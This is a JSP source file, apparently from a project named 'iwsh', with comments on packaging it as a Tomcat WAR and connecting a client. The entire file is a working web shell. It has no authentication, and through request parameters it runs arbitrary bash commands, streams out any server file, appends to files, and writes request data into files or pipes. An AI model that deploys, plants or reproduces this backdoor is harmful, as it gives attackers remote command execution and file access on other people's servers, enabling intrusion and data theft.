<%@ page import="java.util.*,java.io.*"%>
<%@ page import="java.io.InputStream, java.io.OutputStream, java.io.FileInputStream" %>

<%/*
*   Created by NumquamScire for iwsh project.
*   For tomcat: 'zip -r web_app.war iwsh.jsp'
*       Upload web_app.war
*       Access to full interactive web shell use client iwsh.sh -u http://localhost/web_app/iwsh.jsp -d 
*/%>

<%
if (request.getParameter("o") != null || request.getParameter("i") != null || request.getParameter("c") != null || request.getParameter("fi") != null || request.getParameter("s") != null) {

    if (request.getParameter("i") != null) {
        String fi="/tmp/i";
        if (request.getParameter("fi") != null) {
            fi=request.getParameter("fi");
        } 
        java.io.BufferedWriter writer = new java.io.BufferedWriter(new java.io.FileWriter(fi, true));
        writer.write(request.getParameter("i"));
        writer.close();
    }
    if (request.getParameter("c") != null) { 
            String[] commandArray = { "/bin/bash", "-c", request.getParameter("c") };
            ProcessBuilder processBuilder = new ProcessBuilder(commandArray);
            Process process = processBuilder.start();
            
            // Capture the output
            InputStream inputStream = process.getInputStream();
            InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
            BufferedReader reader = new BufferedReader(inputStreamReader);

            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line.trim());
            }

            // Wait for the process to complete
            int exitCode = process.waitFor();
        }
        if (request.getParameter("o") != null) {
            String filePath = request.getParameter("o");

            try {
                FileInputStream fileInputStream = new FileInputStream(filePath);
                OutputStream outputStream = response.getOutputStream();

                byte[] buffer = new byte[1024];
                int bytesRead;

                while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                    outputStream.flush();  // Flush after each chunk for real-time streaming
                }

                fileInputStream.close();
                outputStream.close();
            } catch (Exception e) {
                response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
            }
        }
        if (request.getParameter("s") != null) {
            String fi = request.getParameter("s");
            try (ServletInputStream inputStream = request.getInputStream();
                 FileOutputStream pipeOutputStream = new FileOutputStream(fi)) {
                byte[] buffer = new byte[2048]; 
                int bytesRead;
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    String not_keep_alive = new String(buffer, 0, bytesRead);
                    if ("%1b%1c".equals(not_keep_alive)) {
                        continue;
                    }
                    String decodedChunk = java.net.URLDecoder.decode(not_keep_alive, "UTF-8");
                    byte[] decodedBytes = decodedChunk.getBytes("UTF-8");
                    pipeOutputStream.write(decodedBytes);
                }

            }
        }
        return;
}
%>
